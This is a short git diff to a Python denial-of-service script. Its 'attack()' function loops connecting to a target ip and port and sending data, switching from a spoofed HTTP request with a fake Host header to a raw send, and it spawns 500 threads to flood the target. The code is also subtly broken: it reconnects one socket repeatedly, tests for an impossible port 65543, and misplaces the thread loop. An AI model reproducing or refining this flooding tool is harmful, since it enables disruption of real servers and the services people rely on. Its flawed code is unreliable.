@@ -88,9 +88,9 @@ def main():
 def attack():
   while True:
     s.connect((ip, port))
-    #s.send(bytes)
-    s.sendto(("GET /" + ip + "HTTP/1.1\r\n").encode('ascii'), (ip, port))
-    s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
+    s.send(bytes)
+    #s.sendto(("GET /" + ip + "HTTP/1.1\r\n").encode('ascii'), (ip, port))
+    #s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
     pocket = pocket + 1
     print(f"pocket{pocket}")
     time.sleep(2)
@@ -98,12 +98,10 @@ def attack():
     if port == 65543:
       port = int(port) - 1
 
-  s.close()
-
+  s.close()    
+      
+if __name__ == "__main__":
+  main()
   for i in range(500):
     thread = threading.Thread(target = attack)
     thread.start()
-      
-      
-if __name__ == "__main__":
-    main()
